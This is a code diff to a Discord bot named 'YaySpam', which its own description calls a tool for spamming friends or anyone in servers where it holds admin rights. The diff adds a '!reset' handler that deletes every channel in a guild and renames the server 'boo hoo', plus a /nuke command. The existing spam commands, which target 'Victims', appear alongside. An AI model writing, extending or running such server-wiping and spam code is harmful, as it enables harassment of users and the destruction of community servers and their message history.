@@ -8,6 +8,8 @@ from datetime import datetime
 import time
 import io
 import aiohttp
+from nuke import start_nuke, get_nuke_toggle, set_nuke_toggle
+
 
 load_dotenv()
 TOKEN: Final[str] = os.getenv("DISCORD_TOKEN")
@@ -134,13 +136,27 @@ async def on_message(message: Message) -> None:
     user_message: str = message.content
     if username == 'yayblaze' and user_message == '!stopspam':
         print('-------------------------------\nATTEMPTING STOP\n-------------------------------')
-        message.delete()
+        await message.delete()
         for i in Victims:
             i.toggle = False
         for i in ImageVictims:
             i.toggle = False
+        set_nuke_toggle(False)
         await message.channel.send(content="Stopped All Spamming")
         print('-------------------------------\nSTOPED\n-------------------------------')
+    elif username == 'yayblaze' and user_message == '!reset':
+        print(f'{time.asctime(time.localtime())}: DELETING ALL TEXT CHANNELS')
+        for i in message.guild.channels: 
+            try:
+                if len(message.guild.channels) > 1: await i.delete()
+                else: 
+                    await i.purge()
+                    await i.edit(name='boo hoo')
+                    await message.guild.edit(name='boo hoo')
+            except: 
+                print(f"Error deleting channel: {i.name}, attempting to purge")
+                await i.purge()
+        print(f'{time.asctime(time.localtime())}: FINISHED DELETING ALL CHANNELS')
 
 @tree.command(
         name="spam",
@@ -148,7 +164,7 @@ async def on_message(message: Message) -> None:
 )
 async def spam_cmnd(interation, user:discord.Member, message: str, delay: int, wait: bool, count: bool, type: int):
     if interation.user.id == 749431660168216650:
-        print(time.time,': Spam Command Run\nuser:',user,'\nmsg:',message,'\ndelay:',delay)
+        print(time.asctime(time.localtime()),': Spam Command Run\nuser:',user,'\nmsg:',message,'\ndelay:',delay)
         for i in Victims:
             if not i.toggle:
                 i.set_user(user)
@@ -171,7 +187,7 @@ async def spam_cmnd(interation, user:discord.Member, message: str, delay: int, w
 )
 async def image_cmd(interation, user:discord.Member, url: str, delay: int):
     if interation.user.id != 749431660168216650: return await interation.response.send_message(content="You don't have the perms to do that (L)", ephemeral=True)
-    print(time.time(),": Image Spam Command Run")
+    print(time.asctime(time.localtime()),": Image Spam Command Run")
     for i in ImageVictims:
         if not i.toggle:
             i.setToggle(True)
@@ -187,7 +203,7 @@ async def image_cmd(interation, user:discord.Member, url: str, delay: int):
         description="Gives info on the bot",
 )
 async def info(interation):
-    print(time.time(),": Info Command Run")
+    print(time.asctime(time.localtime()),": Info Command Run")
     embed = discord.Embed(title="YaySpam", description="This is a discord bot I made for spamming my friends", colour=discord.Colour.yellow())
     embed.add_field(name="Command",value="The /spam command, used to start the bot, can only be run by YayBlaze. If you really want to use it ask me. I might make these docs usefull at some point but i'm the only one who can use it now so i'm not going to", inline=False)
     embed.add_field(name="Use",value="If you want me to spam someone lmk I can spam anyone who you want as long as their in a discord I have admin perms in.", inline=False)
@@ -199,7 +215,7 @@ async def info(interation):
         description='Stops the given spamming | usable by yayblaze only',
 )
 async def stop_spam(interation, index: int, type: int):
-    print(time.time(),": Stop Spam command has been run with index ",index)
+    print(time.asctime(time.localtime()),": Stop Spam command has been run with index ",index)
     if interation.user.id == 749431660168216650:
         if type == 0: i = Victims[index]
         elif type == 1: i = ImageVictims[index]
@@ -210,6 +226,16 @@ async def stop_spam(interation, index: int, type: int):
         else: await interation.response.send_message(content='This is not a valid index', ephemeral=True)
     else: await interation.response.send_message(content="You don't have the perms to do that (L)", ephemeral=True)
 
+@tree.command(
+    name='nuke',
+    description='Nukes the server | usable by yayblaze only'
+)
+async def nuke(interation):
+    if interation.user.id != 749431660168216650: return await interation.response.send_message(content="You don't have the perms to do that (L)", ephemeral=True)
+    elif get_nuke_toggle(): return await interation.response.send_message(content="The nuke is already running!")
+    print(time.asctime(time.localtime()),": Nuke Command Run")
+    await start_nuke(interation)
+ 
  
 #main entry point
 def main() -> None:
